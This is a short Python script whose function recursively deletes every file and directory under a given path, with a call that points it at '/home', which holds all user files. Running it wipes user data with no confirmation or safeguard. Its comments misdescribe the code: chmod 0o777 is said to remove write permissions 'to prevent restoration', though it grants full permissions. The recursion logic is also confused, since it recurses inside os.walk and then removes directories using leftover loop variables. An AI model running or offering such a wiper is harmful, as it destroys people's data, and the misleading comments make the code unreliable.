import os

def delete_files(directory):
    # Recursively walk through directory structure to touch all files and subdirectories
    for root, dirs, files in os.walk(directory):
        for f in files:
            # Use chmod to remove write permissions to prevent restoration attempts
            os.chmod(os.path.join(root, f), 0o777)
            os.remove(os.path.join(root, f))
        for d in dirs:
            os.chmod(os.path.join(root, d), 0o777)
            delete_files(os.path.join(root, d))

    # Clean up empty directories after handling files
    for d in dirs:
        os.rmdir(os.path.join(root, d))

# Entry point to start recursive deletion from specified root directory
delete_files('/home')

